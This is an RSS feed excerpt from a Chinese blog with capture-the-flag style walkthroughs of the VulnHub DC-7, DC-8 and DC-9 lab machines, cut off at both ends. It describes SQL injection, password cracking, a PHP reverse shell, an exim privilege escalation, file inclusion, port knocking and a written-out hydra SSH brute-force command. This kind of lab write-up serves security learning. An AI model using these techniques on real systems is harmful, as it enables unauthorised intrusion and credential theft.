id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;&#xA;&lt;h4 id=&#34;敏感信息泄露&#34;&gt;敏感信息泄露&lt;/h4&gt;&#xA;&lt;p&gt;在靶场描述里说挑战不完全是技术性的，要跳出框框思考，说明突破口可能不是网站本身，找找看&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240722153902603-2143634694.png&#34; alt=&#34;image-20240722153902459&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在页脚发现一个叫@DC7USER的用户，搜搜结果发现了该用户的github&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240722153954182-252992894.png&#34; alt=&#34;image-20240722153954052&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;看看他发的代码：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240722154037579-75814788.png&#34; alt=&#34;image-20240722154037391&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在config.php里面发现了账密，试试登录drupal呢&lt;/p&gt;&#xA;&lt;h4 id=&#34;利用账密连接ssh&#34;&gt;利用账密连接ssh&lt;/h4&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240722154220029-1754029050.png&#34; alt=&#34;image-20240722154219764&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;错了，那还有登陆的地方就是22端口的ssh服务，连接试试：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240722154353802-1278096501.png&#34; alt=&#34;image-20240722154353498&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这就getshell了？&lt;/p&gt;&#xA;&lt;h4 id=&#34;shell下的信息搜集&#34;&gt;shell下的信息搜集&lt;/h4&gt;&#xA;&lt;p&gt;正常进行信息收集，看看suid、sudo、内核等：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240722154723818-2042137893.png&#34; alt=&#34;image-20240722154723089&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;确实没有什么利用点，那可能就是有什么利用文件了，找找看：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240722154946915-1767379922.png&#34; alt=&#34;image-20240722154945910&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;当前目录有备份文件夹，但里面是加密的gpg文件，而mbox记录了root的定时任务，路径为&lt;code&gt;/opt/scripts/backups.sh&lt;/code&gt;，过去看看：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240722155603946-1048303683.png&#34; alt=&#34;image-20240722155603261&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;利用这个root的任务可以提权，但发现脚本只有root和www-data可写，得想办法拿到www-data身份，那就得通过web服务拿shell，那么入手点又要回到后台，先看看脚本&lt;/p&gt;&#xA;&lt;p&gt;脚本内容：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 删除 /home/dc7user/backups/ 目录下的所有文件  &lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm /home/dc7user/backups/*  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 切换目录到 /var/www/html/  &lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /var/www/html/  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 使用 Drush 工具导出数据库，并将结果保存为 /home/dc7user/backups/website.sql  &lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drush sql-dump --result-file&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/dc7user/backups/website.sql  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 返回上级目录  &lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 将 html/ 目录的内容打包成 website.tar.gz 并保存在 /home/dc7user/backups/ 目录下  &lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar -czf /home/dc7user/backups/website.tar.gz html/  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 使用 GPG 对 /home/dc7user/backups/website.sql 文件进行对称加密，并用指定的密码保护  &lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 使用 GPG 对 /home/dc7user/backups/website.tar.gz 文件进行对称加密，并用指定的密码保护  &lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 将 /home/dc7user/backups/ 目录下所有文件的所有者改为 dc7user  &lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chown dc7user:dc7user /home/dc7user/backups/*  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 删除 /home/dc7user/backups/website.sql 文件  &lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm /home/dc7user/backups/website.sql  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 删除 /home/dc7user/backups/website.tar.gz 文件  &lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm /home/dc7user/backups/website.tar.gz&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里重点在于drush，是一个简化了创建和管理Drupal8网站的命令行工具，可以用来修改密码：&lt;/p&gt;</description>
    </item>
    <item>
      <title>DC-8渗透笔记</title>
      <link>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-8%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-8%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h1 id=&#34;dc-8渗透笔记&#34;&gt;DC-8渗透笔记&lt;/h1&gt;&#xA;&lt;p&gt;靶场描述：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723155111350-1542013783.png&#34; alt=&#34;image-20240723155111312&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;信息搜集&#34;&gt;信息搜集&lt;/h3&gt;&#xA;&lt;p&gt;IP、端口、网页目录一条龙：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723154406432-764470172.png&#34; alt=&#34;image-20240723154405800&#34;&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;IP为192.168.111.191&lt;/li&gt;&#xA;&lt;li&gt;端口开放了22、80&lt;/li&gt;&#xA;&lt;li&gt;目录可以看到登陆后台&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;再看看网页：&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723155137948-874519673.png&#34; alt=&#34;image-20240723155138488&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这次的cms是drupal 7&lt;/p&gt;&#xA;&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;&#xA;&lt;h4 id=&#34;sql注入获取密码哈希&#34;&gt;sql注入获取密码哈希&lt;/h4&gt;&#xA;&lt;p&gt;翻翻各个页面：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723155508733-401835021.png&#34; alt=&#34;image-20240723155509329&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;发现有的页面是使用nid参数进行控制的，看看有没有sql注入：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723155606974-871969811.png&#34; alt=&#34;image-20240723155607358&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;还真有，直接sqlmap一把梭：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;爆库名：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723155923218-635417641.png&#34; alt=&#34;image-20240723155923879&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;库名为d7db&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;爆表名：&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723160129872-1837485563.png&#34; alt=&#34;image-20240723160130253&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;88张表，里面的users表值得关注&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;爆列名：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723160351154-843048956.png&#34; alt=&#34;image-20240723160351831&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;16列，主要关注其中的name和pass&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;爆字段：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723160553107-1416067232.png&#34; alt=&#34;image-20240723160553549&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;ok拿到两组密码哈希&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;john破解密码哈希&#34;&gt;john破解密码哈希&lt;/h4&gt;&#xA;&lt;p&gt;把获得的账密写入文档：&lt;/p&gt;&#xA;&lt;p&gt;用john进行暴力破解：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723165105131-222840877.png&#34; alt=&#34;image-20240723165104712&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;admin的密码无法破解但john的密码是turtle&lt;/p&gt;&#xA;&lt;h4 id=&#34;后台反弹shell&#34;&gt;后台反弹shell&lt;/h4&gt;&#xA;&lt;p&gt;直接在/user/login登录，成功，接下来就是在后台看看有没有写文件之类能够用来getshell的点了：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723170022989-959123157.png&#34; alt=&#34;image-20240723170023205&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;发现确实有个写php代码的位置，懒得连webshell再反弹了，直接写反弹shell代码：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723170719934-2029780122.png&#34; alt=&#34;image-20240723170720274&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;确认页面后，填写信息，发送php代码：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723170817435-1899728033.png&#34; alt=&#34;image-20240723170818119&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;成功反弹shell：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723175435012-1614575436.png&#34; alt=&#34;image-20240723175434401&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;python获取pty：&lt;/p&gt;&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723175529073-1615727724.png&#34; alt=&#34;image-20240723175529833&#34; style=&#34;zoom:150%;&#34; /&gt;&#xA;&lt;p&gt;进入提权阶段&lt;/p&gt;&#xA;&lt;h3 id=&#34;权限提升&#34;&gt;权限提升&lt;/h3&gt;&#xA;&lt;p&gt;接下来就是针对提权的信息收集了，发现suid权限的配置有点问题：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723180955060-1851463582.png&#34; alt=&#34;image-20240723180955112&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这个exim4有点问题，看看：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723181218154-456358045.png&#34; alt=&#34;image-20240723181218053&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;发现该版本存在权限提升的漏洞&lt;/p&gt;&#xA;&lt;p&gt;cp一下脚本，并且编辑查看文件类型：set ff=unix，这样脚本才能再linux下执行&lt;/p&gt;&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723183337664-1331504732.png&#34; alt=&#34;image-20240723183337904&#34; style=&#34;zoom:150%;&#34; /&gt;&#xA;&lt;p&gt;将该脚本上传到靶机上并赋予执行权限：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723182320106-196468743.png&#34; alt=&#34;image-20240723182320320&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;按照使用方法执行脚本：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723183955859-775465713.png&#34; alt=&#34;image-20240723183956070&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;再在/root拿到flag：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723184155146-1311014351.png&#34; alt=&#34;image-20240723184155302&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;&#xA;&lt;p&gt;本次渗透过程中，我们遇到了如下漏洞或利用：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;drupal 7页面id存在sql注入&lt;/li&gt;&#xA;&lt;li&gt;john破解密码哈希&lt;/li&gt;&#xA;&lt;li&gt;后台contact页面能以php代码编辑，实现反弹shell&lt;/li&gt;&#xA;&lt;li&gt;exim4.89 存在权限提升漏洞&lt;/li&gt;&#xA;&lt;/ul&gt;</description>
    </item>
    <item>
      <title>DC-9渗透笔记</title>
      <link>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-9%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-9%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h1 id=&#34;dc-9渗透笔记&#34;&gt;DC-9渗透笔记&lt;/h1&gt;&#xA;&lt;h3 id=&#34;信息搜集&#34;&gt;信息搜集&lt;/h3&gt;&#xA;&lt;p&gt;IP、端口、目录一条龙：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723215750025-193802802.png&#34; alt=&#34;image-20240723215749893&#34;&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;IP为192.168.111.142&lt;/li&gt;&#xA;&lt;li&gt;端口开放了22、80&lt;/li&gt;&#xA;&lt;li&gt;目录只扫到一点点&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;再看看web页面：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723225635884-1618970454.png&#34; alt=&#34;image-20240723225636482&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;并不是什么通用的cms，那就从功能点入手：&#xA;搜索功能点有个输入框，用万能密码试试：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723230246642-1706289929.png&#34; alt=&#34;image-20240723230246708&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;直接爆出了所有员工信息：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723230340311-48484347.png&#34; alt=&#34;image-20240723230341051&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可知这里有SQL注入&lt;/p&gt;&#xA;&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;&#xA;&lt;h4 id=&#34;sql注入&#34;&gt;sql注入&lt;/h4&gt;&#xA;&lt;p&gt;sqlmap跑一下&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;爆库名：&lt;/p&gt;&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723231014920-237618282.png&#34; alt=&#34;image-20240723231015222&#34; style=&#34;zoom:150%;&#34; /&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;爆表名：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723231142808-634555820.png&#34; alt=&#34;image-20240723231143352&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;打印表：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723233703220-237900667.png&#34; alt=&#34;image-20240723233703690&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;获得了员工的账密，但是没有admin，再看看Staff库：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723233959438-1688894244.png&#34; alt=&#34;image-20240723234000091&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;有俩表&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;爆俩表：&lt;/p&gt;&#xA;&lt;p&gt;StaffDetails：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723234201725-1029927531.png&#34; alt=&#34;image-20240723234202150&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Users：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723234919837-170453054.png&#34; alt=&#34;image-20240723234920669&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;得到了admin的密码&lt;strong&gt;transorbital1&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;文件包含&#34;&gt;文件包含&lt;/h4&gt;&#xA;&lt;p&gt;成功登录：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723235443990-2083694630.png&#34; alt=&#34;image-20240723235444210&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;注意到页脚有“File does not exist”，一眼定真，存在文件包含，之前DC也遇到过，猜猜参数：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240723235747422-1912561015.png&#34; alt=&#34;image-20240723235748018&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;哈哈还真是&lt;/p&gt;&#xA;&lt;p&gt;接下来本来想尝试包含日志文件写马的，但是没有试出日志文件路径。。。&lt;/p&gt;&#xA;&lt;p&gt;那么如何getshell？我们包含的时候可见passwd文件有很多用户，和数据库中用户一致，所以可以尝试一下ssh爆破：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hydra -L name.txt -P pass.txt ssh://192.168.111.142&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240724005321374-2089920908.png&#34; alt=&#34;image-20240724005321921&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;不行，拒绝连接，这里应该是存在敲门服务：&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;存在knockd服务。 该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来&amp;quot;敲门&amp;quot;，使系统开启需要访问的服务端口，才能对外访问。 不使用时，再使用自定义的序列号来&amp;quot;关门&amp;quot;，将端口关闭，不对外监听。进一步提升了服务和系统的安全 //配置文件路径 默认配置文件是：/etc/knockd.conf&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;所以先包含一下配置文件看看：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240724005717441-1043386151.png&#34; alt=&#34;image-20240724005718384&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;所以要依次对7469、8475、9842敲门，再连接ssh服务：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;敲门：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240724010039225-405432143.png&#34; alt=&#34;image-20240724010039783&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以看见ssh已开启：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240724010631089-752345795.png&#34; alt=&#34;image-20240724010631697&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;接下来再ssh爆破：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240724011605517-1402283747.png&#34; alt=&#34;image-20240724011604902&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;获得了三组账户&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;ssh连接&#34;&gt;ssh连接&lt;/h4&gt;&#xA;&lt;p&gt;三组用户都登陆试试，最后发现janitor的个人目录下有一个目录，看看：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240724012649026-1785542544.png&#34; alt=&#34;image-20240724012649351&#34;&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
